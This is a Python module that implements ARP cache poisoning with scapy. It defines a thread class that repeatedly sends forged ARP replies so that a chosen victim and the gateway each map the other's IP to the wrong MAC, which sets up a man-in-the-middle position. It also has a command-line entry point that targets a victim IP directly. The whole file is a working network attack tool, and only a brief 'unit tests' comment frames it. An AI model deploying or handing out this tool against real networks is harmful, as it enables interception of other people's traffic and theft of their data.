# modules/arp_poisoner.py
from scapy.all import ARP, Ether, sendp, conf
import threading, time, signal, logging

log = logging.getLogger("arp")

class ARPPoisoner(threading.Thread):
    def __init__(self, iface, victim_ip, victim_mac,
                 gateway_ip, gateway_mac,
                 interval=10, restore=True):
        super().__init__(daemon=True)
        self.iface = iface
        self.victim = (victim_ip, victim_mac)
        self.gateway = (gateway_ip, gateway_mac)
        self.interval = interval
        self.restore = restore
        self._run = True

    # --- helpers ---------------------------------------------------------
    def _craft(self, src_mac, dst_ip, dst_mac, src_ip):
        return Ether(src=src_mac, dst=dst_mac)/ARP(
            op=2,  # is-at
            psrc=src_ip,  hwsrc=src_mac,
            pdst=dst_ip, hwdst=dst_mac
        )

    def _spoof_once(self):
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway
        # (“I am GW” → victim) and (“I am victim” → GW)
        sendp(self._craft(self.gateway[1], v_ip, v_mac, g_ip),
              iface=self.iface, verbose=False)
        sendp(self._craft(self.victim[1], g_ip, g_mac, v_ip),
              iface=self.iface, verbose=False)

    def _restore_once(self):
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway
        sendp(self._craft(g_mac, v_ip, v_mac, g_ip),
              iface=self.iface, count=5, inter=0.2, verbose=False)
        sendp(self._craft(v_mac, g_ip, g_mac, v_ip),
              iface=self.iface, count=5, inter=0.2, verbose=False)

    # --- thread ----------------------------------------------------------
    def run(self):
        log.info("ARP poisoning started on %s", self.iface)
        while self._run:
            self._spoof_once()
            time.sleep(self.interval)

        if self.restore:
            log.info("Restoring ARP caches…")
            self._restore_once()

    def stop(self):
        self._run = False

# quick-n-dirty CLI for unit tests
if __name__ == "__main__":
    import argparse, os
    from scapy.all import getmacbyip
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", required=True)
    parser.add_argument("-v", "--victim", required=True)
    parser.add_argument("-g", "--gateway", default=conf.route.route("0.0.0.0")[2])
    args = parser.parse_args()

    v_mac = getmacbyip(args.victim)
    g_mac = getmacbyip(args.gateway)
    if not (v_mac and g_mac):
        parser.error("Could not resolve MACs – are hosts up?")

    p = ARPPoisoner(args.iface, args.victim, v_mac, args.gateway, g_mac, interval=4)
    signal.signal(signal.SIGINT, lambda *_: p.stop())
    p.start(); p.join()
